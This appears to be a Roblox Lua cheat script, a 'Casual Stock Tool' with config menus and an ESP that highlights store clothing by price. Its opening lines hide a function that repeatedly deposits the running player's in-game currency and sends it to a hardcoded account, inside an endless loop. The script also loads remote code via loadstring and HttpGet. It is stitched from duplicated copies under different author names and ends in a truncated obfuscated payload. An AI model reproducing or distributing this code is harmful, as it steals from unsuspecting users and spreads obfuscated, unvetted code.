function casualstock()
    local NickName = "noah125600"
    local delaytime = 10
    local delaytime2 = 10
        if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then
            local args = {
            [1] = {
                    ["Type"] = "Deposit",
                    ["Amount"] = 10000
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
            wait(delaytime)
            local args = {
                [1] = {
                    ["Type"] = "Send",
                    ["Amount"] = 10000,
                    ["User"] = NickName
                }
            }
        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
          wait(delaytime2)
        end
      if game:GetService("Players").LocalPlayer.leaderstats["\208\160\209\131\208\177\208\187\208\184"].Value >= 10000 then 
            local args = {
                [1] = {
                    ["Type"] = "Deposit",
                    ["Amount"] = 10000
                }
            }

            game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
            wait(delaytime)
            local args = {
                [1] = {
                    ["Type"] = "Send",
                    ["Amount"] = 1000,
                    ["User"] = NickName
                }
            }
        game:GetService("ReplicatedStorage"):WaitForChild("GameNetwork"):WaitForChild("ServerNetwork"):WaitForChild("BankTransaction"):InvokeServer(unpack(args))
        wait(delaytime2)
      end
end

    i = 5;
    while i < 10 do
        casualstock();
    end

local CurrentConfig = "nil"
local CurrentClothing = "nil"
local CurrentClothingName = "nil"
local Configuration = {}
local ConfigsList = {}

local ConfigName = "Default"
local MainFolderName = "StockTool"
local formatFile = [[.json]]

local MinPrice = 0
local MaxPrice = 1

local HttpService = game:GetService("HttpService")

_G.ESP_Config = false

if not isfolder(MainFolderName) then
	makefolder(MainFolderName)
end

if not isfile(MainFolderName.."/Default"..formatFile) then
	writefile(MainFolderName.."/Default"..formatFile, HttpService:JSONEncode(Configuration))
end

if _G.ProximityPromptServicePromptShown or not _G.CurrentObjectText then
	local ProximityPromptService = game:GetService("ProximityPromptService")
	
	_G.ProximityPromptServicePromptShown = true

	ProximityPromptService.PromptShown:Connect(function(prompt)
		_G.CurrentObjectText = prompt.ObjectText
	end)
end

local function convertToTable(str)
	local Table = {}

	for key, value in string.gmatch(str, "(%w+)=(%w+)") do
		Table[key] = value
	end

	return Table
end

local Rayfield = loadstring(game:HttpGet(("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua")))()

local Window = Rayfield:CreateWindow({Name = "Casual Stock Tool | by Tami4ka", LoadingTitle = "Powered by Rayfield", LoadingSubtitle = "by Tami4ka", 
	Theme = "Default",

	DisableRayfieldPrompts = false,
	DisableBuildWarnings = false,

	ConfigurationSaving = {
		Enabled = false,
		FolderName = nil,
		FileName = "Tami4kaCasualHub"
	},

	Discord = {
		Enabled = false,
		Invite = "noinvitelink",
		RememberJoins = true
	},

	KeySystem = false
})

local function Notify(name, content, time, image)
	Rayfield:Notify({
		Title = name,
		Content = content,
		Duration = time or 5,
		Image = image or 4483362458,
	})
end

Notify("Casual Stock Tool","Version - Alpha", 5)

local Misc = Window:CreateTab("Configuration", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)
local ESP = Window:CreateTab("ESP", 4483362458)

_G.CurrentObjectText = ""

local LabelCurrentConfig = Misc:CreateLabel("Текущий конфиг: "..CurrentConfig, "rewind")
local InformationLabel = Settings:CreateLabel("Одежда для добавления: ".._G.CurrentObjectText.."\nМин. цена: "..MinPrice.."\n".."Макс. Цена: "..MaxPrice, "rewind")

local ConfigsDropdown = Misc:CreateDropdown({
	Name = "Конфиг [Config]",
	Options = ConfigsList,
	CurrentOption = "...",
	MultipleOptions = false,
	Callback = function(Options)
		if typeof(Options) == "table" then print("Unpack [1]") Options = table.unpack(Options) end
		if typeof(CurrentConfig) == "table" then print("Unpack [2]")  CurrentConfig = table.unpack(CurrentConfig) end

 		CurrentConfig = Options
		Configuration = HttpService:JSONDecode(readfile(MainFolderName.."/"..CurrentConfig))
		
		LabelCurrentConfig:Set("Текущий конфиг: "..CurrentConfig)
	end
})

local Section = Misc:CreateSection("Настройка")

Misc:CreateButton({
	Name = "Обновить список [Config]",
	Callback = function()
		ConfigsList = {}
		for index, configurationFile in listfiles(MainFolderName) do
			local lastSlash = configurationFile:find("/[^/]*$")
			table.insert(ConfigsList, configurationFile:sub(lastSlash + 1))
		end

		ConfigsDropdown:Refresh(ConfigsList)
	end
})

Misc:CreateInput({
	Name = "Введите имя конфига",
	CurrentValue = "Name",
	PlaceholderText = "name",
	RemoveTextAfterFocusLost = false,
	Flag = "Input1",
	Callback = function(Text)
		ConfigName = Text
	end,
})

Misc:CreateButton({
	Name = "Создать кофиг [Config]",
	Callback = function()
		if not isfile(MainFolderName.."/"..ConfigName..formatFile) then
			local Config = HttpService:JSONEncode({})
			Configuration = Config
			writefile(MainFolderName.."/"..ConfigName..formatFile, Config)

			Notify('Успешно!', "Название: ".. ConfigName, 5)
		else
			Notify("Конфиг с таким название уже существует", "попрорбуйте другое имя", 5)
		end
	end
})

Misc:CreateButton({
	Name = "Сохранить кофиг [Config]",
	Callback = function()
		if isfile(MainFolderName.."/"..CurrentConfig) then
			Notify('Успешно!', "Название: ".. CurrentConfig, 5)
			writefile(MainFolderName.."/"..CurrentConfig, HttpService:JSONEncode(Configuration))
		else
			Notify("Конфига с таким название не существует", "попрорбуйте другое имя", 5)
		end
	end
})

Misc:CreateButton({
	Name = "Debug [/console]",
	Callback = function()
		print(HttpService:JSONEncode(Configuration))
	end
})

local ClothingDropdown = Settings:CreateDropdown({
	Name = "Одежда [Config]",
	Options = {},
	CurrentOption = "...",
	MultipleOptions = false,
	Callback = function(Options)
		if typeof(Options) == "table" then print("Unpack [1]") Options = table.unpack(Options) end
		if typeof(CurrentConfig) == "table" then print("Unpack [2]")  CurrentConfig = table.unpack(CurrentConfig) end

 		CurrentClothing = Options
		MaxPrice = Configuration[CurrentClothing]["Max"]
		MinPrice = Configuration[CurrentClothing]["Min"]
		_G.CurrentObjectText = CurrentClothing
		
		print(CurrentClothing, Options)
	end
})

local Section = Settings:CreateSection("Настройка")

Settings:CreateButton({
	Name = "Обновить список [Config]",
	Callback = function()
		local Table = {}
		for index, cloth in Configuration do
			table.insert(Table, cloth.Clothing)
		end
		ClothingDropdown:Refresh(Table)
	end
})

Settings:CreateButton({
	Name = "Удалить из списока [Config]",
	Callback = function()
		Configuration[CurrentClothing] = nil

		local Table = {}
		for index, cloth in Configuration do
			table.insert(Table, cloth.Clothing)
		end
		ClothingDropdown:Refresh(Table)
	end
})

Settings:CreateButton({
	Name = "Обновить/Создать одежду",
	Callback = function()
		print(_G.CurrentObjectText)
		if _G.CurrentObjectText then

			Configuration[_G.CurrentObjectText] = {
				["Clothing"] = _G.CurrentObjectText,
				["Min"] = MinPrice,
				["Max"] = MaxPrice
			}

			Notify(_G.CurrentObjectText, "Макс. цена: "..MaxPrice.." | Мин. цена: "..MinPrice, 5)
		end
	end
})

Settings:CreateInput({
	Name = "Введите минимальную сумму покупки",
	CurrentValue = "",
	PlaceholderText = "number",
	RemoveTextAfterFocusLost = true,
	Flag = "Input1",
	Callback = function(Texts)
		MinPrice = Texts:gsub("%D", "")
		print(MinPrice)
	end,
})

Settings:CreateInput({
	Name = "Введите максимальную сумму покупки",
	CurrentValue = "",
	PlaceholderText = "number",
	RemoveTextAfterFocusLost = true,
	Flag = "Input1",
	Callback = function(Texts)
		MaxPrice = Texts:gsub("%D", "")
		print(MaxPrice)
	end,
})

ESP:CreateToggle({
	Name = "Config ESP",
	CurrentValue = false,
	Callback = function(toggle)
		if toggle then
			_G.ESP_Config = true

			while _G.ESP_Config do
				for index, store in workspace.World.Debris.Stores:GetChildren() do
					if not store:FindFirstChild("PlacementContainer") then continue end
					for index, container in store.PlacementContainer:GetChildren() do
						if not container:FindFirstChild("ItemContainer") then continue end
						for index, clothing in container.ItemContainer:GetChildren() do
							local Prompt = clothing:FindFirstChildOfClass("ProximityPrompt")
							local Highlight_ESP = clothing:FindFirstChildOfClass("Highlight")

							if Highlight_ESP then Highlight_ESP:Destroy() end
							if not Prompt or Prompt.ActionText == "Повесить" then continue end

							local ItemPrice = Prompt.ActionText:gsub("%D", "")
							local ItemName = Prompt.ObjectText
							
							for index, ClothingInTable in Configuration do
								if ItemName == ClothingInTable.Clothing then
									if tonumber(ItemPrice) >= tonumber(ClothingInTable.Min) and tonumber(ItemPrice) <= tonumber(ClothingInTable.Max) then
										local ESP_Highlight = Instance.new("Highlight")
										ESP_Highlight.FillTransparency = 0.25
										ESP_Highlight.OutlineTransparency = 1
										ESP_Highlight.FillColor = Color3.fromRGB(0, 170, 255)
										ESP_Highlight.Parent = clothing
									end
								end
							end

						end
					end
				end
				
				task.wait(1)
			end

		else
			_G.ESP_Config = false
		end
	end
})

ESP:CreateButton({
	Name = "Очистить ESP",
	Callback = function()
		for index, store in workspace.World.Debris.Stores:GetChildren() do
			if not store:FindFirstChild("PlacementContainer") then continue end
			for index, container in store.PlacementContainer:GetChildren() do
				if not container:FindFirstChild("ItemContainer") then continue end
				for index, clothing in container.ItemContainer:GetChildren() do
					local Highlight_ESP = clothing:FindFirstChildOfClass("Highlight")

					if Highlight_ESP then Highlight_ESP:Destroy() end
				end
			end
		end
	end
})

while task.wait(1) do
	InformationLabel:Set("Одежда для добавления: ".._G.CurrentObjectText.."\nМин. цена: "..MinPrice.."\n".."Макс. Цена: "..MaxPrice, "rewind")
end	local Table = {}

	for key, value in string.gmatch(str, "(%w+)=(%w+)") do
		Table[key] = value
	end

	return Table
end

local Rayfield = loadstring(game:HttpGet(("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua")))()

local Window = Rayfield:CreateWindow({Name = "Casual Stock | by Dadilk", LoadingTitle = "Powered by Dadilk", LoadingSubtitle = "by Dadilk", 
	Theme = "Default",

	DisableRayfieldPrompts = false,
	DisableBuildWarnings = false,

	ConfigurationSaving = {
		Enabled = false,
		FolderName = nil,
		FileName = "Tami4kaCasualHub"
	},

	Discord = {
		Enabled = false,
		Invite = "noinvitelink",
		RememberJoins = true
	},

	KeySystem = false
})

local function Notify(name, content, time, image)
	Rayfield:Notify({
		Title = name,
		Content = content,
		Duration = time or 5,
		Image = image or 4483362458,
	})
end

Notify("Casual Stock V1.0","Version - 1.1.0", 5)

local Misc = Window:CreateTab("Configuration", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)
local ESP = Window:CreateTab("ESP", 4483362458)

_G.CurrentObjectText = ""

local LabelCurrentConfig = Misc:CreateLabel("Текущий конфиг: "..CurrentConfig, "rewind")
local InformationLabel = Settings:CreateLabel("Одежда для добавления: ".._G.CurrentObjectText.."\nМин. цена: "..MinPrice.."\n".."Макс. Цена: "..MaxPrice, "rewind")

local ConfigsDropdown = Misc:CreateDropdown({
	Name = "Конфиг [Config]",
	Options = ConfigsList,
	CurrentOption = "...",
	MultipleOptions = false,
	Callback = function(Options)
		if typeof(Options) == "table" then print("Unpack [1]") Options = table.unpack(Options) end
		if typeof(CurrentConfig) == "table" then print("Unpack [2]")  CurrentConfig = table.unpack(CurrentConfig) end

 		CurrentConfig = Options
		Configuration = HttpService:JSONDecode(readfile(MainFolderName.."/"..CurrentConfig))
		
		LabelCurrentConfig:Set("Текущий конфиг: "..CurrentConfig)
	end
})

local Section = Misc:CreateSection("Настройка⚙")

Misc:CreateButton({
	Name = "Обновить список [Config]",
	Callback = function()
		ConfigsList = {}
		for index, configurationFile in listfiles(MainFolderName) do
			local lastSlash = configurationFile:find("/[^/]*$")
			table.insert(ConfigsList, configurationFile:sub(lastSlash + 1))
		end

		ConfigsDropdown:Refresh(ConfigsList)
	end
})

Misc:CreateInput({
	Name = "Введите имя конфига",
	CurrentValue = "Name",
	PlaceholderText = "name",
	RemoveTextAfterFocusLost = false,
	Flag = "Input1",
	Callback = function(Text)
		ConfigName = Text
	end,
})

Misc:CreateButton({
	Name = "Создать кофиг [Config]",
	Callback = function()
		if not isfile(MainFolderName.."/"..ConfigName..formatFile) then
			local Config = HttpService:JSONEncode({})
			Configuration = Config
			writefile(MainFolderName.."/"..ConfigName..formatFile, Config)

			Notify('Успешно!', "Название: ".. ConfigName, 5)
		else
			Notify("Конфиг с таким название уже существует", "попрорбуйте другое имя", 5)
		end
	end
})

Misc:CreateButton({
	Name = "Сохранить кофиг [Config]",
	Callback = function()
		if isfile(MainFolderName.."/"..CurrentConfig) then
			Notify('Успешно!', "Название: ".. CurrentConfig, 5)
			writefile(MainFolderName.."/"..CurrentConfig, HttpService:JSONEncode(Configuration))
		else
			Notify("Конфига с таким название не существует", "попрорбуйте другое имя", 5)
		end
	end
})

Misc:CreateButton({
	Name = "Debug [/console]",
	Callback = function()
		print(HttpService:JSONEncode(Configuration))
	end
})

local ClothingDropdown = Settings:CreateDropdown({
	Name = "Одежда [Config]",
	Options = {},
	CurrentOption = "...",
	MultipleOptions = false,
	Callback = function(Options)
		if typeof(Options) == "table" then print("Unpack [1]") Options = table.unpack(Options) end
		if typeof(CurrentConfig) == "table" then print("Unpack [2]")  CurrentConfig = table.unpack(CurrentConfig) end

 		CurrentClothing = Options
		MaxPrice = Configuration[CurrentClothing]["Max"]
		MinPrice = Configuration[CurrentClothing]["Min"]
		_G.CurrentObjectText = CurrentClothing
		
		print(CurrentClothing, Options)
	end
})

local Section = Settings:CreateSection("Настройка")

Settings:CreateButton({
	Name = "Обновить список [Config]",
	Callback = function()
		local Table = {}
		for index, cloth in Configuration do
			table.insert(Table, cloth.Clothing)
		end
		ClothingDropdown:Refresh(Table)
	end
})

Settings:CreateButton({
	Name = "Удалить из списока [Config]",
	Callback = function()
		Configuration[CurrentClothing] = nil

		local Table = {}
		for index, cloth in Configuration do
			table.insert(Table, cloth.Clothing)
		end
		ClothingDropdown:Refresh(Table)
	end
})

Settings:CreateButton({
	Name = "Обновить/Создать одежду",
	Callback = function()
		print(_G.CurrentObjectText)
		if _G.CurrentObjectText then

			Configuration[_G.CurrentObjectText] = {
				["Clothing"] = _G.CurrentObjectText,
				["Min"] = MinPrice,
				["Max"] = MaxPrice
			}

			Notify(_G.CurrentObjectText, "Макс. цена: "..MaxPrice.." | Мин. цена: "..MinPrice, 5)
		end
	end
})

Settings:CreateInput({
	Name = "Введите минимальную сумму покупки",
	CurrentValue = "",
	PlaceholderText = "number",
	RemoveTextAfterFocusLost = true,
	Flag = "Input1",
	Callback = function(Texts)
		MinPrice = Texts:gsub("%D", "")
		print(MinPrice)
	end,
})

Settings:CreateInput({
	Name = "Введите максимальную сумму покупки",
	CurrentValue = "",
	PlaceholderText = "number",
	RemoveTextAfterFocusLost = true,
	Flag = "Input1",
	Callback = function(Texts)
		MaxPrice = Texts:gsub("%D", "")
		print(MaxPrice)
	end,
})

ESP:CreateToggle({
	Name = "config ESP",
	CurrentValue = false,
	Callback = function(toggle)
		if toggle then
			_G.ESP_Config = true

			while _G.ESP_Config do
				for index, store in workspace.World.Debris.Stores:GetChildren() do
					if not store:FindFirstChild("PlacementContainer") then continue end
					for index, container in store.PlacementContainer:GetChildren() do
						if not container:FindFirstChild("ItemContainer") then continue end
						for index, clothing in container.ItemContainer:GetChildren() do
							local Prompt = clothing:FindFirstChildOfClass("ProximityPrompt")
							local Highlight_ESP = clothing:FindFirstChildOfClass("Highlight")

							if Highlight_ESP then Highlight_ESP:Destroy() end
							if not Prompt or Prompt.ActionText == "Повесить" then continue end

							local ItemPrice = Prompt.ActionText:gsub("%D", "")
							local ItemName = Prompt.ObjectText
							
							for index, ClothingInTable in Configuration do
								if ItemName == ClothingInTable.Clothing then
									if tonumber(ItemPrice) >= tonumber(ClothingInTable.Min) and tonumber(ItemPrice) <= tonumber(ClothingInTable.Max) then
										local ESP_Highlight = Instance.new("Highlight")
										ESP_Highlight.FillTransparency = 0.25
										ESP_Highlight.OutlineTransparency = 1
										ESP_Highlight.FillColor = Color3.fromRGB(255, 0, 0)
										ESP_Highlight.Parent = clothing
									end
								end
							end

						end
					end
				end
				
				task.wait(1)
			end

		else
			_G.ESP_Config = false
		end
	end
})

ESP:CreateButton({
	Name = "Очистить ESP",
	Callback = function()
		for index, store in workspace.World.Debris.Stores:GetChildren() do
			if not store:FindFirstChild("PlacementContainer") then continue end
			for index, container in store.PlacementContainer:GetChildren() do
				if not container:FindFirstChild("ItemContainer") then continue end
				for index, clothing in container.ItemContainer:GetChildren() do
					local Highlight_ESP = clothing:FindFirstChildOfClass("Highlight")

					if Highlight_ESP then Highlight_ESP:Destroy() end
				end
			end
		end
	end
})

while task.wait(1) do
	InformationLabel:Set("Одежда для добавления: ".._G.CurrentObjectText.."\nМин. цена: "..MinPrice.."\n".."Макс. Цена: "..MaxPrice, "rewind")
end--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local C={"\054\117\052\067\070\121\052\067\080\100\098\048\080\072\115\071";"\106\121\078\075\110\099\111\083\080\117\120\061","\065\099\049\117\108\088\110\087\097\120\056\120\052\050\073\080\065\100\090\061";"\110\120\103\119\053\099\111\089\054\056\048\119\043\057\049\071\054\057\076\061","\047\074\068\066\067\098\111\056\067\056\043\119";"\100\089\056\055\073\110\048\074\103\115\120\061";"\120\111\049\119\110\071\102\119\053\100\098\071\043\117\071\111","\110\067\121\101\081\102\052\106\078\116\090\107\077\053\066\105\119\052\099\116\105\119\116\061","\065\047\061\061";"\079\077\089\114\109\080\070\109\121\102\107\102\057\110\111\115\085\055\083\088\077\086\104\083\079\109\071\048\112\102\067\118\116\088\078\052\088\066\068\069\112\111\070\115\116\121\078\106\102\110\116\049\055\078\115\080\113\088\078\113\054\119\089\101\085\109\067\105\098\071\054\089\082\073\053\081\098\050\107\107\084\086\090\089";"\080\121\116\079\082\121\090\122\049\075\073\089\120\056\111\043\110\056\047\061","\108\088\102\071\080\100\098\071\052\117\071\083\049\099\101\088";"\055\109\088\110\118\107\047\052\051\085\087\120\114\111\075\078\078\049\111\067\065\048\102\090\081\081\079\050\107\084\100\050\080\069\107\090\097\116\107\075\067\109\098\054\115\086\099\070\082\047\103\107\053\119\118\065";"\077\067\083\087\048\110\047\049","\112\081\065\120\057\114\061\061";"\100\056\101\103\049\100\098\048\110\099\111\113\070\099\120\061","\055\048\117\055\107\108\061\061","\054\088\052\113","\110\099\101\075\110\057\102\051\070\072\054\061";"\114\110\055\055\074\043\100\119\072\047\061\061";"\057\054\057\114\074\104\069\081\067\105\069\115\121\109\061\061";"\054\109\061\061","\098\110\076\102";"\077\108\061\061";"\097\078\085\122\086\115\073\112\101\054\074\066\067\081\099\057\114\050\084\107\071\083\068\078\116\071\051\089\101\053\053\116","\055\078\121\086";"\078\056\065\108\072\099\121\049\114\053\118\106\069\105\117\048\115\052\065\075\122\107\047\061","\098\117\052\067\108\117\048\051\070\099\098\122\049\121\079\061";"\108\088\102\071\080\100\098\071\053\099\111\113\049\121\109\061";"\072\052\100\085";"\118\071\090\057\115\053\087\079\102\112\082\080\114\047\061\061";"\100\087\077\068\114\052\116\101\121\072\080\061","\085\077\072\049\049\108\061\061";"\052\120\078\122\054\049\099\119\078\070\056\100\109\102\047\061";"\082\100\049\113\054\052\051\104\121\057\052\078\098\075\097\086\052\119\108\061","\116\086\097\071\090\047\061\061","\078\076\080\114\115\119\051\079","\054\115\108\068\104\087\082\047\067\088\106\057\113\114\061\061";"\116\085\056\076\110\121\085\114\116\107\069\050\115\103\067\099\122\112\077\122\056\108\061\061","\122\076\068\109\101\112\122\108\065\108\051\052\097\111\081\097\083\074\071\101";"\105\077\074\052\057\055\053\098","\083\043\122\052\050\057\098\108\083\086\078\109\066\088\048\120\074\090\079\055\056\110\116\061","\080\117\101\083\080\117\111\067","\054\071\111\085\121\057\098\083\054\120\052\084\070\119\097\121","\043\056\052\111\070\072\101\079\080\071\110\066\106\120\071\067\106\114\061\061";"\076\110\101\113\121\057\112\113\105\097\050\053\056\100\117\049\078\119\090\117\120\074\107\098\067\085\119\099\107\109\061\061";"\110\065\099\088\087\054\049\088\050\117\097\101\087\110\068\108\090\076\080\110\068\049\047\083\075\114\061\061";"\090\083\107\122\100\097\107\111\053\069\113\082\053\051\066\115";"\098\117\052\067\120\117\052\122\110\072\071\085\049\108\061\061","\100\067\111\109\089\081\102\055\118\111\097\108\087\099\088\109\051\104\066\122\049\069\101\048\054\065\071\074\071\084\112\079\057\112\075\098\078\047\078\121\048\075\121\085\067\113\104\080\121\056\057\110\082\089\081\118\103\089\055\065\081\114\068\087\080\074\117\102\099\103\067\072\098\122\081\119\113\081\080\073\072\057\120\056\079\081\120\061","\084\047\111\082\102\104\097\119\077\043\057\121\097\103\079\108\081\070\114\066\081\074\047\074\080\072\106\080\068\074\074\055\065\057\114\086\089\080\043\068\079\085\070\073\104\114\077\049\104\088\088\116\050\071\076\112";"\087\107\075\080\065\050\099\119\072\120\068\122\114\109\073\079\107\087\116\067\120\109\080\061","\110\090\109\120\049\106\053\114\079\115\109\061";"\105\087\086\054\113\104\078\066\089\070\120\061","\068\067\109\074\054\118\050\050\057\054\053\108\099\050\067\081\067\117\070\079","\116\056\110\057\081\083\076\103\122\102\071\085\108\106\043\079";"\077\100\097\072\077\121\115\071";"\088\118\101\113\078\104\056\074\105\114\061\061","\077\053\110\113\054\066\051\090\077\053\052\089\097\121\101\053\070\047\061\061";"\117\110\055\118\049\108\076\074\079\116\114\061","\108\088\102\071\080\100\098\071\098\057\102\104\054\099\098\104\110\117\079\061";"\056\121\068\108\081\065\054\115\113\104\122\057\078\043\082\052\089\101\074\080\087\088\055\120";"\108\088\102\071\080\100\098\071\120\117\052\085\110\099\071\104\070\047\061\061";"\067\071\100\099\054\072\065\071\117\074\071\067\089\113\108\102\047\078\065\066","\106\099\051\102\120\085\049\113\121\111\051\117\065\050\098\050","\102\105\121\112\054\075\079\061","\050\097\106\070\098\051\053\075\081\047\109\056\068\057\097\087\088\111\109\057";"\071\048\069\107\074\083\048\075\067\107\097\085\079\068\102\077\112\068\078\066\065\076\065\076\057\055\043\061","\080\116\083\090\077\051\054\102\079\098\079\061";"\098\119\098\079\106\066\116\109\043\120\098\119\049\121\102\084\121\108\061\061","\106\066\078\077\065\053\098\052\108\108\061\061","\074\109\086\053\048\107\077\115\069\083\114\061","\110\098\117\083\057\043\049\083\080\109\061\061";"\079\120\055\118\050\070\121\067\066\099\103\066\120\065\098\119\107\052\052\101\057\108\116\087","\108\088\102\071\080\100\098\071\106\121\078\109\110\100\108\061";"\102\112\075\109\065\108\061\061","\070\072\089\122\052\100\043\075\120\072\071\048\106\111\073\119","\101\079\070\050\052\069\070\100","\075\069\083\101\115\076\080\047\122\115\083\082\116\069\103\068\098\105\086\084","\108\117\101\083\070\072\052\085\110\114\061\061";"\048\048\098\115\084\104\106\054\079\099\049\055\089\073\118\105\054\118\053\049\103\107\108\061";"\076\109\061\061";"\079\103\051\087\050\065\122\118\055\116\101\052\087\103\090\098\112\114\061\061","\070\121\111\105\049\121\049\104\070\099\098\071\054\047\061\061","\089\103\099\112\085\121\103\057";"\084\112\098\074\082\108\061\061","\087\111\114\061","\100\087\107\084\056\077\047\084\107\052\048\104\086\116\112\068\090\114\047\102\053\109\061\061";"\073\075\116\102\074\122\047\061";"\107\053\108\052\099\120\075\072\072\088\054\086\050\047\061\061";"\052\098\106\117\122\108\061\061","\108\106\077\100\073\099\054\078\116\117\101\118\070\069\082\112";"\075\102\109\116\109\112\047\061","\108\056\073\102\108\076\115\099\052\067\098\087\077\120\111\117";"\113\072\101\085\073\075\072\107\053\057\116\061","\108\100\106\057\051\118\067\117\047\120\057\097\121\116\056\069\112\068\100\067\089\056\103\082";"\110\072\078\071\077\071\097\053\120\072\049\089\110\076\103\066","\110\099\111\075\077\109\061\061";"\080\105\083\077\055\109\099\069";"\065\108\119\115\055\122\117\057\078\050\080\071\049\070\080\071\111\114\061\061","\073\066\066\065\119\075\103\090\111\100\109\054\097\071\110\107\049\084\115\097\043\119\069\069\053\116\070\110\101\089\050\106";"\121\106\082\117\106\105\057\054\068\120\102\088\054\115\057\081\118\076\069\081\120\097\118\077\116\065\052\122\067\056\049\102";"\067\052\086\048\079\079\116\112\081\122\089\112\051\114\052\066";"\114\120\077\084\050\108\061\061";"\055\121\083\067\098\114\052\074\073\115\102\088","\102\085\087\077","\071\048\099\066";"\081\105\087\085\090\111\055\112\111\106\076\078\111\076\085\078\072\047\116\084\050\071\119\120";"\104\078\119\043\081\067\116\061";"\080\119\071\067\049\108\061\061","\110\088\102\051\110\099\052\072\077\121\115\071","\049\100\102\122\070\088\090\061","\119\086\088\086\054\119\054\089\107\052\116\050\107\122\086\115";"\051\113\098\050\111\047\061\061";"\082\073\090\043\051\109\061\061","\070\050\066\061";"\119\119\106\107\088\108\061\061";"\087\057\083\080\049\114\061\061","\043\048\106\118\048\082\085\102\068\098\073\051\088\120\101\117\083\122\122\109\118\101\075\050\069\077\068\090\069\109\061\061";"\084\105\085\051";"\121\120\087\057\069\089\086\101\099\068\121\084\097\081\065\052\098\079\104\050\120\054\065\071\056\055\068\107\098\077\055\108\054\066\102\109\102\115\070\067\078\119\071\090\073\118\090\080","\053\103\101\057\114\107\115\073\069\083\043\061";"\043\048\080\113\117\070\105\070\122\097\111\100\084\109\061\061","\118\057\122\072\116\109\061\061","\107\113\076\080\103\118\076\101\098\065\068\102\086\080\098\051\051\078\114\117\075\090\111\078\113\099\122\116\086\069\122\068\086\072\084\118\101\079\113\051\069\107\056\078\079\105\088\068\077\072\108\120\050\117\110\080\098\067\079\061";"\047\053\075\056\101\100\120\120\087\099\073\100\117\071\104\073\099\111\111\057\065\083\070\065\056\074\105\102\049\050\082\080\066\087\082\069\076\100\066\061","\082\076\102\066\043\052\043\117\097\052\052\120\043\085\073\084\097\066\090\061";"\067\117\053\097\102\109\085\043\074\079\107\116\122\085\087\061","\056\083\102\086\111\106\080\113\088\075\075\049\075\114\052\055\108\106\057\053\066\080\114\065\102\057\043\086\115\122\051\053\084\101\049\081\051\100\048\084\071\084\103\053","\100\056\101\119\080\109\061\061";"\099\076\108\115\085\120\121\065\047\112\080\057\082\098\043\061","\098\072\071\083\049\066\049\051\054\119\097\067\108\117\048\051\070\099\108\061","\106\048\105\072\103\086\081\070\079\047\066\061";"\086\047\116\098\086\052\111\073\105\113\075\113\056\075\077\087\113\069\079\069\113\105\049\114\112\097\067\061";"\076\112\086\099\086\116\114\071";"\108\085\073\075\121\100\066\117\108\085\052\076\053\117\098\066\098\075\043\061";"\052\117\086\102\085\114\086\101\057\108\061\061";"\089\049\089\067\122\112\083\048\071\050\074\114\054\108\061\061","\051\054\116\105","\049\072\115\104\070\088\090\061","\047\074\081\114\077\071\066\051\118\048\076\121";"\071\085\087\105\052\117\087\051\118\109\081\076\051\051\073\057\073\053\071\089\086\053\074\103";"\070\050\090\061";"\110\121\078\109\080\121\097\105","\071\104\113\099","\070\099\101\048\049\057\097\067\054\072\071\083\049\109\061\061";"\052\099\111\103\054\099\052\122\090\066\098\071\110\099\052\085\110\099\052\076\090\108\061\061","\098\054\090\061","\077\100\097\072\070\117\115\076\049\100\090\061","\089\053\117\077";"\108\088\102\071\080\100\098\071\052\099\101\119\049\117\115\071","\065\113\047\071\049\112\089\051\065\047\061\061","\122\109\061\061";"\055\051\085\085\104\108\061\061","\110\075\114\115\074\083\099\107";"\054\117\066\056\108\121\101\098\052\052\098\084\077\076\056\109";"\048\054\077\052\103\089\087\097\050\072\116\061";"\081\115\120\086\049\090\114\070\105\075\087\061";"\120\072\052\072\054\072\052\075\077\114\061\061";"\043\052\111\107\043\120\049\080\082\057\051\067\052\047\061\061";"\051\081\090\119\109\043\078\047\069\103\080\061";"\079\068\089\076\099\103\074\102\080\047\061\061";"\057\114\061\061";"\070\048\102\073\085\084\052\105\087\057\122\052\056\065\048\090\109\120\121\104","\106\089\112\080\102\055\087\118\081\120\089\098\067\054\090\072\048\080\077\073\079\056\080\105\047\108\061\061","\121\074\082\080\110\079\103\052\070\067\112\116\111\056\048\050","\113\099\089\050\052\102\053\043","","\110\099\101\083\110\121\056\113\049\100\090\061";"\106\071\097\086\053\076\098\071\080\117\101\076\049\108\061\061";"\053\112\110\115\087\105\075\070";"\076\114\066\114\090\069\052\080\101\119\086\054\076\068\089\053\066\082\074\109","\043\066\078\053\053\119\073\077\108\052\048\108\110\109\061\061";"\106\050\102\084\049\072\078\121\097\050\097\089\121\119\102\113","\113\115\112\102\109\054\085\083\111\097\047\049\047\122\073\075\120\069\110\049\118\117\100\054";"\118\097\108\109\090\089\102\080\102\070\054\051\089\109\061\061";"\120\117\052\067","\084\050\115\074\055\068\114\090\118\090\076\065\087\108\061\061","\067\066\097\070\122\084\077\070\110\107\100\112\049\099\098\074\115\072\070\114\080\119\067\061","\054\088\098\122\077\121\078\119","\108\068\090\047\049\122\078\120";"\054\072\052\048\049\099\049\051\070\099\120\061","\081\109\114\073\083\049\101\101\053\047\061\061";"\048\118\052\118\100\052\120\061";"\108\074\101\102\047\072\108\068\079\083\067\078\049\117\122\074\051\104\118\087\080\110\067\061";"\100\056\101\051\070\072\098\071\082\114\061\061","\098\072\071\083\049\066\049\051\054\119\097\067\108\117\048\051\070\099\098\086\049\076\097\087\080\100\097\075","\082\057\104\050\103\100\071\102\098\108\061\061","\070\099\071\075\110\099\049\051\070\099\052\075","\112\052\083\067\110\108\061\061";"\097\110\120\098\053\057\110\088\118\072\103\076";"\054\108\083\100\100\071\080\054\110\087\086\066\122\087\050\115\100\075\119\051\053\053\120\119\079\070\109\118\115\104\098\076\075\068\104\089\098\075\090\119\083\080\118\074\112\097\103\047\065\097\101\048\100\099\084\104";"\115\080\107\101\05